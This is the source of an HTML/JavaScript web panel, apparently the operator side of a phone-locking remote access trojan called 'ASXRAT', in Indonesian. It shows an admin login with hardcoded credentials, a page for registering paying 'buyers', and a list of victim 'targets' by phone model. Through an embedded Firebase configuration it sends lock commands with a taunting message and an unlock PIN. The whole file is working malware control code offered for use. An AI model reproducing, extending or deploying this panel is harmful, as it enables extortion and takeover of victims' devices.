<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V-PROJECT | ELVOXI [IEA]</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        :root { 
            --neon-green: #00ff88; 
            --bg-dark: #050505; 
            --panel: #121216;
            --blue-btn: #5cb8ff;
            --gray: #888; 
        }

        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; flex-direction: column; }
        .box { border: 1px solid #222; padding: 25px; border-radius: 20px; width: 340px; background: var(--panel); text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: var(--neon-green); letter-spacing: 3px; margin-bottom: 5px; }
        .sub-txt { color: var(--gray); font-size: 10px; margin-bottom: 20px; text-transform: uppercase; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #1a1a20; border: 1px solid #333; color: #fff; border-radius: 10px; outline: none; }
        button { width: 95%; padding: 12px; cursor: pointer; font-weight: bold; background: var(--neon-green); color: #000; border: none; border-radius: 10px; margin-top: 10px; }

        /* LIST TARGET */
        .target-card { background: #1a1a20; border: 1px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 10px; text-align: left; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .target-card:hover { border-color: var(--neon-green); }

        /* MODAL STYLE GACOR */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(8px); }
        .modal-content { background: #111115; border: 1px solid #333; padding: 25px; border-radius: 25px; width: 300px; }
        .field-label { font-size: 11px; color: var(--gray); margin-left: 5px; display: block; margin-top: 10px; }
        .modal-input { width: 90%; background: #000; border: 1px solid #333; border-radius: 12px; padding: 12px; color: var(--neon-green); }
        .btn-send { background: var(--blue-btn) !important; color: #000 !important; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="page-login" class="box">
        <h2>ASXRAT REALTIME</h2>
        <div class="sub-txt">JANGAN MEMBAGIKAN USERNAME DAN PW AKJN ANDA</div>
        <input type="text" id="log-user" placeholder="USERNAME">
        <input type="password" id="log-pass" placeholder="PASSWORD">
        <button onclick="handleLogin()">LOGIN</button>
    </div>

    <div id="page-admin" class="box" style="display:none;">
        <h2>ADMIN PANEL</h2>
        <div class="sub-txt">Register New Buyer</div>
        <input type="text" id="reg-user" placeholder="USERNAME">
        <input type="text" id="reg-pass" placeholder="PASSWORD">
        <button onclick="createAccount()">CREATE ACCOUNT</button>
        <button onclick="location.reload()" style="background: #ff4444; color: white;">LOGOUT</button>
    </div>

    <div id="page-buyer" class="box" style="display:none;">
        <h2 id="user-title">ASXRAT REALTIME</h2>
        <div class="sub-txt">Click Target to Open Controls</div>
        <div id="target-list">Scanning...</div>
        <button onclick="location.reload()" style="background: #ff4444; color: white;">LOGOUT</button>
    </div>
    
   
    <div id="modal-ctrl" class="modal">
        <div class="modal-content">
            <h3 style="color: var(--blue-btn); margin-top: 0;">🔒 Locked Device</h3>
            
            <label class="field-label">Lock Message</label>
            <input type="text" id="lock-msg" class="modal-input" placeholder="mampus lu anj">

            <label class="field-label">Unlock PIN</label>
            <input type="number" id="lock-pin" class="modal-input" placeholder="142535">

            <button class="btn-send" onclick="sendLock()">SEND LOCK</button>
            <button onclick="sendUnlock()" style="background:none; color:#ff4444; border:1px solid #ff4444; width:100%; padding:10px; border-radius:10px; margin-top:10px; font-weight:bold;">UNLOCK</button>
            <button onclick="closeModal()" style="background:none; color:var(--gray); border:none; width:100%; margin-top:10px; cursor:pointer;">CANCEL</button>
        </div>
    </div>

    <script>
        const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
      measurementId: "G-XMHT2S731L"
    };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let loggedUser = "";
        let selectedTid = "";

        // --- FUNGSI LOGIN ---
        function handleLogin() {
            let u = document.getElementById('log-user').value;
            let p = document.getElementById('log-pass').value;

            // Admin Login
            if (u === "elvoxi" && p === "123") {
                showPage('page-admin');
            } else {
                // Buyer Login
                db.ref("accounts/" + u).once("value", (snap) => {
                    if (snap.exists() && snap.val().pw === p) {
                        loggedUser = u;
                        showPage('page-buyer');
                        document.getElementById('user-title').innerText = u.toUpperCase();
                        fetchTargets(u);
                    } else { alert("Login Gagal!"); }
                });
            }
        }

        function createAccount() {
            let u = document.getElementById('reg-user').value;
            let p = document.getElementById('reg-pass').value;
            if(u && p) {
                db.ref("accounts/" + u).set({ pw: p }).then(() => alert("User " + u + " Created!"));
            }
        }

        // --- LOAD TARGET ---
        function fetchTargets(user) {
            db.ref("users/" + user).on("value", (snap) => {
                const list = document.getElementById('target-list');
                list.innerHTML = "";
                snap.forEach((child) => {
                    let hp = child.val().model_hp || "Unknown Device";
                    let div = document.createElement('div');
                    div.className = "target-card";
                    div.innerHTML = `<b>📱 ${hp}</b><small>${child.key}</small>`;
                    div.onclick = () => openModal(child.key); // KLIK BARU MUNCUL POP-UP
                    list.appendChild(div);
                });
            });
        }

        // --- MODAL LOGIC ---
        function openModal(tid) {
            selectedTid = tid;
            document.getElementById('modal-ctrl').style.display = "flex";
        }
        function closeModal() { document.getElementById('modal-ctrl').style.display = "none"; }

        function sendLock() {
            let m = document.getElementById('lock-msg').value || "LOCKED";
            let p = document.getElementById('lock-pin').value || "123";
            db.ref("users/" + loggedUser + "/" + selectedTid).update({
                lock: "ON", lock_pesan: m, lock_pw: p
            }).then(() => { alert("Lock Sent!"); closeModal(); });
        }

        function sendUnlock() {
            db.ref("users/" + loggedUser + "/" + selectedTid).update({ lock: "OFF" })
            .then(() => { alert("Unlocked!"); closeModal(); });
        }

        function showPage(id) {
            document.getElementById('page-login').style.display = 'none';
            document.getElementById('page-admin').style.display = 'none';
            document.getElementById('page-buyer').style.display = 'none';
            document.getElementById(id).style.display = 'inline-block';
        }
    </script>
</body>
</html>
